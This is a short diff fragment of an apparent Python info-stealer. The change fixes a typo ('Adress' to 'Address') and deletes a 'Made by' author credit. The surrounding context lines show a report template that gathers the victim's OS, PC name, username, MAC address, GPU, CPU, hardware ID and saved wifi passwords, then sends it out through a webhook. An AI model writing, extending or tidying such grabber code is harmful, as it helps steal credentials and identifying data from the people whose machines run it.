@@ -70,7 +70,7 @@ Pc info:
 Operating system: {platform.system()}
 Version: {platform.release()}
 Pc Name: {pcuname}
-Pc UserName: {pcname}\nMac Adress: {mac}
+Pc UserName: {pcname}\nMac Address: {mac}
 Grapic Card: {gpu_info.Name}
 Processor: {proc_info.Name}
 Hardware ID: {hwid}
@@ -93,8 +93,6 @@ Saved wifi passwords:
 {profiles}
 
 Date: {Date}
-
-Made by <@738138455476797581>
 
 ''')
 response = webhook.execute()
